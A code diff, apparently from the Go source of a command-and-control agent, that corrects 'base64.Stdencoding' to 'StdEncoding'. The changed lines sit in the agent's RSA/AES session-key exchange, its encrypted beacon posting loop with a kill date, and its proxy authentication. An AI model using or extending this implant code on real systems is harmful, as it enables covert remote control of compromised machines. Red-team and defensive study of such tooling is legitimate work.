@@ -271,7 +271,7 @@ func (c *C2Default) NegotiateKey() bool {
 	initMessage := structs.EkeKeyExchangeMessage{}
 	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
-	initMessage.PubKey = base64.Stdencoding.EncodeToString(pub)
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
 	raw, err := json.Marshal(initMessage)
@@ -291,9 +291,9 @@ func (c *C2Default) NegotiateKey() bool {
 		return false
 	}
 
-	encryptedSessionKey, _ := base64.Stdencoding.DecodeString(sessionKeyResp.SessionKey)
+	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
 	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
-	c.Key = base64.Stdencoding.EncodeToString(decryptedKey) // Save the new AES session key
+	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
 	c.ExchangingKeys = false
 
 	if len(sessionKeyResp.UUID) > 0 {
@@ -327,7 +327,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
 
-	sendData = []byte(base64.Stdencoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
 	for true {
 		today := time.Now()
 		if today.After(c.Killdate) {
@@ -364,7 +364,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 
 		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
 			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
-			basicAuth := "Basic " + base64.Stdencoding.EncodeToString([]byte(auth))
+			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
 			req.Header.Add("Proxy-Authorization", basicAuth)
 		}
 
@@ -395,9 +395,9 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 			continue
 		}
 
-		raw, err := base64.Stdencoding.DecodeString(string(body))
+		raw, err := base64.StdEncoding.DecodeString(string(body))
 		if err != nil {
-			fmt.Printf("error base64.Stdencoding: %v\n", err)
+			fmt.Printf("error base64.StdEncoding: %v\n", err)
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			continue
 		}
@@ -428,11 +428,11 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 }
 
 func (c *C2Default) encryptMessage(msg []byte) []byte {
-	key, _ := base64.Stdencoding.DecodeString(c.Key)
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
 func (c *C2Default) decryptMessage(msg []byte) []byte {
-	key, _ := base64.Stdencoding.DecodeString(c.Key)
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
